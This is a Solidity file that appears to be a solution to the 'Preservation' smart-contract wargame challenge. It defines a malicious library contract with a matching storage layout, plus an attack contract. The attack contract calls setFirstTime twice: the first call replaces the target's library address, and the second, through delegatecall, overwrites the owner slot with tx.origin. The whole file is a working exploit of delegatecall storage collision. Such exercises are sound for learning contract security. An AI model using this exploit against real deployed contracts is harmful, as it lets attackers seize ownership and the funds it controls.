// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Preservation.sol";

contract AttackerLib {
    // needs same storage layout as Preservation, i.e.,
    // we want owner at slot index 2
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}

contract PreservationAttack {
    Preservation public challenge;
    AttackerLib public attackerLib;

    constructor(address challengeAddress) public {
        challenge = Preservation(challengeAddress);
        attackerLib = new AttackerLib();
    }

    function attack() external {
        challenge.setFirstTime(uint256(address(attackerLib)));
        challenge.setFirstTime(0);
    }
}
